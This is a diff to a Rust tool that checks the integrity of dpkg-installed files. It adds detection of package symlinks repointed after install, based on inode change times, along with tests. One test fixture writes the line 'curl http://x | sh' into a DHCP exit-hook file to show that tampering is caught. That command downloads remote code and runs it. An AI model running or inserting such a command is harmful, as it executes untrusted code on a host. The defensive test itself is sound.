@@ -34,6 +34,22 @@ pub fn present(root: &Root) -> bool {
     root.exists(STATUS)
 }
 
+/// How long after a package's file list is written its other files may
+/// still be landing. dpkg writes the `.list` and then installs the new files
+/// in the same unpack, moments apart; a restore or an image layer extracted
+/// in bulk spreads them by seconds. A file whose inode changed later than
+/// this was changed after its package was installed.
+pub(crate) const INSTALL_WINDOW: std::time::Duration = std::time::Duration::from_secs(120);
+
+/// An inode's change time cannot be set from userspace, so a file dpkg
+/// wrote in the same unpack as `<pkg>.list` and a file changed since are
+/// told apart by it; a change well past the window is one dpkg did not
+/// make. On an image copied rather than mounted the ctimes are the copy's,
+/// and the comparison says nothing either way.
+pub(crate) fn changed_after_install(file: std::time::SystemTime, list: std::time::SystemTime) -> Option<std::time::Duration> {
+    file.duration_since(list).ok().filter(|after| *after > INSTALL_WINDOW)
+}
+
 /// Every path the file lists claim, root-relative, for a scan that asks
 /// about all of them.
 pub fn packaged_files(root: &Root) -> BTreeSet<PathBuf> {
@@ -219,9 +235,8 @@ fn diversions(root: &Root) -> BTreeMap<PathBuf, (PathBuf, String)> {
 /// `path` is the file on disk, `listed` the name the package's manifests
 /// give it; they differ only for a diverted file.
 fn verify(root: &Root, path: &Path, listed: &Path, pkg: &str, info: &PkgInfo) -> Integrity {
-    let Some(actual) = super::digests(root, path) else {
-        return Integrity::Unknown;
-    };
+    // Digests of the file behind the path, links followed.
+    let actual = super::digests(root, path);
 
     // A conffile is checked against the digest dpkg recorded for it, and a
     // difference is expected rather than alarming. Without this, every host
@@ -229,7 +244,7 @@ fn verify(root: &Root, path: &Path, listed: &Path, pkg: &str, info: &PkgInfo) ->
     let conffile = |p: &Path| {
         spellings(root, p).into_iter().find_map(|s| info.conffiles.get(&*s.to_string_lossy()).cloned())
     };
-    if let Some(expected) = conffile(listed) {
+    if let (Some(expected), Some(actual)) = (conffile(listed), &actual) {
         return if expected.eq_ignore_ascii_case(&actual.md5) { Integrity::Intact } else { Integrity::ConffileModified };
     }
 
@@ -239,7 +254,7 @@ fn verify(root: &Root, path: &Path, listed: &Path, pkg: &str, info: &PkgInfo) ->
     // makes an ordinary `#!/bin/sh` resolve instead of reporting unverifiable
     // on every script on the host.
     if root.stat(path).is_ok_and(|m| m.is_symlink) {
-        if let Ok(target) = root.read_link(path) {
+        if let (Ok(target), Some(actual)) = (root.read_link(path), &actual) {
             let resolved = if target.is_absolute() {
                 root.rel(&target)
             } else {
@@ -263,8 +278,14 @@ fn verify(root: &Root, path: &Path, listed: &Path, pkg: &str, info: &PkgInfo) ->
                 };
             }
         }
+        // A link dpkg lists but leads nowhere it digests — a unit masked to
+        // /dev/null by the package that ships it, an alias into another
+        // package — has one checkable property: when it changed. A link
+        // repointed since install is a new inode with a later change time.
+        return link_by_change_time(root, path, pkg);
     }
 
+    let Some(actual) = actual else { return Integrity::Unknown };
     match shipped_digest(root, pkg, listed) {
         // Not every package ships md5sums, and a path may be absent from one
         // that does. Integrity is then genuinely unknown; calling it intact
@@ -273,6 +294,17 @@ fn verify(root: &Root, path: &Path, listed: &Path, pkg: &str, info: &PkgInfo) ->
         None => Integrity::Unknown,
         Some(expected) if expected.eq_ignore_ascii_case(&actual.md5) => Integrity::Intact,
         Some(_) => Integrity::Modified,
+    }
+}
+
+fn link_by_change_time(root: &Root, link: &Path, pkg: &str) -> Integrity {
+    let (Ok(link), Ok(list)) = (root.stat(link), root.stat(format!("{INFO}/{pkg}.list"))) else {
+        return Integrity::Unknown;
+    };
+    match (link.ctime, list.ctime) {
+        (Some(changed), Some(installed)) if changed_after_install(changed, installed).is_some() => Integrity::Modified,
+        (Some(_), Some(_)) => Integrity::Intact,
+        _ => Integrity::Unknown,
     }
 }
 
@@ -374,6 +406,35 @@ mod tests {
         assert_eq!(integrity(&ask(&f.root(), &["etc/dhcp/dhclient-exit-hooks.d/debug"])), Integrity::Intact);
         f.write("etc/dhcp/debug", b"curl http://x | sh\n");
         assert_eq!(integrity(&ask(&f.root(), &["etc/dhcp/dhclient-exit-hooks.d/debug"])), Integrity::ConffileModified);
+    }
+
+    #[test]
+    fn a_packaged_mask_link_is_intact_until_something_repoints_it() {
+        // sudo ships /usr/lib/systemd/system/sudo.service as a link to
+        // /dev/null. dpkg records no digest for a link and /dev/null has
+        // none, so the only fact left is when the link's inode changed.
+        let f = Fixture::new("mask");
+        std::fs::create_dir_all(f.0.join("usr/lib/systemd/system")).unwrap();
+        std::os::unix::fs::symlink("/dev/null", f.0.join("usr/lib/systemd/system/sudo.service")).unwrap();
+        f.write(STATUS, b"Package: sudo
+Status: install ok installed
+Architecture: amd64
+Version: 1.9
+
+");
+        f.write(&format!("{INFO}/sudo.list"), b"/usr/lib/systemd/system/sudo.service
+");
+        f.write(&format!("{INFO}/sudo.md5sums"), b"");
+        let answers = ask(&f.root(), &["usr/lib/systemd/system/sudo.service"]);
+        assert!(
+            matches!(answers[Path::new("usr/lib/systemd/system/sudo.service")], Provenance::Packaged { integrity: Integrity::Intact, .. }),
+            "written in the same unpack as its list: {:?}",
+            answers[Path::new("usr/lib/systemd/system/sudo.service")]
+        );
+        // A change time well past the list's is a link dpkg did not write.
+        let list = std::time::SystemTime::UNIX_EPOCH + std::time::Duration::from_secs(1_700_000_000);
+        assert!(changed_after_install(list + std::time::Duration::from_secs(3_600), list).is_some());
+        assert!(changed_after_install(list + std::time::Duration::from_secs(30), list).is_none());
     }
 
     #[test]
